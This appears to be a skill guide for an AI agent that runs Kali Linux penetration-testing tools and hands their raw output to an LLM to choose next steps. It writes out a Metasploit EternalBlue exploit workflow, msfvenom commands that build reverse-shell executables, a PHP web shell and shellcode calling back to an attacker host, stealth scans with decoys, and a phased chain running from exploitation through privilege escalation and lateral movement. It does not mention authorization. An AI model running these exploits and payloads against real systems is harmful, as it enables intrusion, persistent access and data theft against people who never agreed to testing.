# Skill: Kali Linux Tooling

> Domain knowledge and workflow patterns for operating standard Kali Linux penetration testing suites and processing their raw output via LLM for actionable intelligence.

---

## Overview

This skill provides best practices for invoking common Kali Linux tools, capturing their output in machine-parseable formats, and using the LLM to analyze, correlate, and summarize results. The goal is to turn raw tool output into structured, actionable findings.

---

## Tool Reference & Best Practices

### 1. Nmap — Network Scanner

**Purpose**: Host discovery, port scanning, service/version detection, OS fingerprinting, vulnerability scanning via NSE.

#### Recommended Invocation Patterns

```bash
# Fast host discovery (ping sweep) — always start here
nmap -sn -PE -PP -PM -oA discovery 10.0.0.0/24

# Standard TCP SYN scan with service detection
nmap -sS -sV -sC -O -oA full_scan -p- --open 10.0.0.5

# Targeted scan for common ports (faster)
nmap -sS -sV -sC -oA quick_scan -p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,8443 10.0.0.5

# UDP scan (slow — limit ports)
nmap -sU -sV --top-ports 50 -oA udp_scan 10.0.0.5

# Vulnerability scanning with NSE
nmap --script vuln -oA vuln_scan 10.0.0.5

# Aggressive scan (noisy — use in permissive environments)
nmap -A -T4 -oA aggressive_scan 10.0.0.5

# Stealth scan with decoys and timing
nmap -sS -T2 -D RND:5 -f --data-length 24 -oA stealth_scan 10.0.0.5
```

#### Output Formats

| Flag | Format | Best For |
|------|--------|----------|
| `-oN` | Normal text | Human review |
| `-oG` | Grepable | Quick `grep`/`awk` processing |
| `-oX` | XML | Programmatic parsing, import into tools |
| `-oA` | All three | **Always use this** — saves .nmap, .gnmap, .xml |

#### LLM Processing Pattern

```
1. Run Nmap with `-oA` to capture all output formats
2. Feed the .nmap (normal) output to the LLM for:
   a. Summarize open ports and services per host
   b. Identify potentially vulnerable services (outdated versions, known CVEs)
   c. Prioritize targets by attack surface
   d. Suggest next-step tools for each discovered service
3. Use .xml output for programmatic correlation with other tools
4. Use .gnmap output for quick grep-based searches
```

#### Common Parsing Commands

```bash
# Extract open ports from grepable output
grep "open" scan.gnmap | awk '{print $2, $4}' | sort -u

# Extract hosts with specific service
grep "http" scan.gnmap | awk '{print $2}'

# Parse XML with xmlstarlet
xmlstarlet sel -t -m "//port[@state='open']" -v "../../../address/@addr" -o ":" -v "@portid" -o " " -v "service/@name" -n scan.xml
```

---

### 2. Metasploit Framework — Exploitation Platform

**Purpose**: Exploit execution, payload generation, post-exploitation, and pivoting.

#### Recommended Workflow

```bash
# Start with database
sudo msfdb init
msfconsole -q

# Import Nmap results
msf> db_import /path/to/scan.xml

# Search for exploits matching discovered services
msf> services -p 445 -R    # Stage all hosts with port 445
msf> search type:exploit name:smb

# Standard exploit workflow
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> show options
msf> set RHOSTS <target>
msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf> set LHOST <attacker_ip>
msf> check                   # Non-intrusive vulnerability check
msf> exploit                 # Execute
```

#### Key msfconsole Commands

| Command | Purpose |
|---------|---------|
| `db_nmap` | Run Nmap directly and import results |
| `services` | List discovered services from DB |
| `vulns` | List identified vulnerabilities |
| `search` | Search modules (type:exploit/auxiliary/post) |
| `check` | Non-intrusive vulnerability verification |
| `sessions -l` | List active sessions |
| `route add` | Add pivot routes through sessions |

#### Payload Generation with msfvenom

```bash
# Windows reverse shell (staged)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf

# Web payloads
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f war -o shell.war

# Shellcode for custom exploits
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f python -b '\x00' EXITFUNC=thread
```

#### LLM Processing Pattern

```
1. After exploitation, capture Meterpreter session info
2. Feed session output (sysinfo, getuid, ps, netstat) to LLM for:
   a. Assess current access level and privilege escalation opportunities
   b. Identify interesting processes (AV, monitoring, databases)
   c. Suggest post-exploitation modules based on context
   d. Map current access to ATT&CK techniques
3. Correlate multiple session outputs for network-wide situational awareness
```

---

### 3. Burp Suite — Web Application Testing

**Purpose**: HTTP/HTTPS interception proxy, web vulnerability scanning, manual testing.

#### Workflow

```
1. CONFIGURE browser proxy to 127.0.0.1:8080
2. SPIDER the target application to build sitemap
3. REVIEW sitemap for:
   - Authentication endpoints
   - File upload functionality
   - API endpoints
   - Input parameters (GET/POST)
4. USE Intruder/Repeater for manual testing on identified attack surfaces
5. EXPORT findings from Scanner (if Pro edition)
```

#### Key Burp Features for LLM Integration

| Feature | Output Format | LLM Use Case |
|---------|--------------|---------------|
| Proxy History | XML export | Analyze request/response patterns |
| Scanner Results | XML/HTML | Prioritize and deduplicate findings |
| Intruder Results | CSV | Analyze fuzzing results for anomalies |
| Logger++ (extension) | CSV/JSON | Bulk log analysis |

#### LLM Processing Pattern

```
1. Export Burp proxy history or scan results as XML
2. Feed to LLM for:
   a. Identify authentication flow weaknesses
   b. Flag insecure headers (missing CSP, HSTS, X-Frame-Options)
   c. Detect potential injection points from parameter analysis
   d. Classify findings by OWASP Top 10 category
   e. Generate remediation recommendations
```

---

### 4. Additional Kali Tools

#### Information Gathering

| Tool | Usage | Output Parsing |
|------|-------|---------------|
| **theHarvester** | Email/domain OSINT | Parse JSON output for unique emails, hosts |
| **Amass** | Subdomain enumeration | `-json` flag for structured output |
| **enum4linux-ng** | SMB/NetBIOS enumeration | Parse YAML output for shares, users |
| **dnsrecon** | DNS enumeration | `-j` for JSON, parse record types |
| **Recon-ng** | OSINT framework | Export workspace data as CSV/JSON |

#### Web Application

| Tool | Usage | Output Parsing |
|------|-------|---------------|
| **Gobuster** | Directory/DNS brute-forcing | Parse stdout, filter by status codes |
| **ffuf** | Web fuzzing | `-o result.json -of json` for JSON output |
| **Nikto** | Web server scanner | `-Format json` for structured reports |
| **SQLMap** | SQL injection | `-output-dir` for organized results, `--dump-format=CSV` |
| **WPScan** | WordPress scanner | `--format json` for structured findings |

#### Password Attacks

| Tool | Usage | Output Parsing |
|------|-------|---------------|
| **Hydra** | Online brute-forcing | `-o hydra.out` for result logging |
| **John the Ripper** | Offline hash cracking | `--show` for cracked passwords |
| **Hashcat** | GPU hash cracking | `-o cracked.txt --outfile-format=2` |
| **CeWL** | Custom wordlist generation | Direct file output for wordlists |

#### Wireless

| Tool | Usage | Output Parsing |
|------|-------|---------------|
| **Aircrack-ng** | WPA/WEP cracking suite | Parse CSV from airodump-ng |
| **Bettercap** | Network attacks | `-eval` for scripted operations |
| **Wifite** | Automated wireless attacks | Parse stdout for credentials |

---

## General LLM Integration Principles

### Input Preparation

```
1. Always capture raw output in a structured format (JSON > XML > CSV > plaintext)
2. Include context metadata:
   - Tool name and version
   - Command line arguments used
   - Target scope
   - Timestamp of execution
3. Truncate excessively large outputs — provide summary + relevant excerpts
4. Redact sensitive credentials before feeding to LLM (unless in secure context)
```

### Output Processing

```
1. ASK the LLM to:
   a. Extract key findings as structured data (JSON)
   b. Classify severity (Critical/High/Medium/Low/Info)
   c. Map to MITRE ATT&CK techniques where applicable
   d. Suggest logical next steps in the engagement
   e. Identify potential false positives
2. VALIDATE LLM interpretations against raw data
3. NEVER rely solely on LLM summarization for critical findings — always verify
```

### Tool Chaining Pattern

```
Phase 1: Discovery
  nmap → host list + service inventory

Phase 2: Enumeration
  nmap services → targeted tools (enum4linux, nikto, gobuster)

Phase 3: Vulnerability Analysis
  enumeration results → vulnerability scanners + manual testing

Phase 4: Exploitation
  confirmed vulns → metasploit / custom PoC → shell access

Phase 5: Post-Exploitation
  shell → privilege escalation → lateral movement → objective

At each phase:
  Raw output → LLM analysis → prioritized next steps → next tool
```
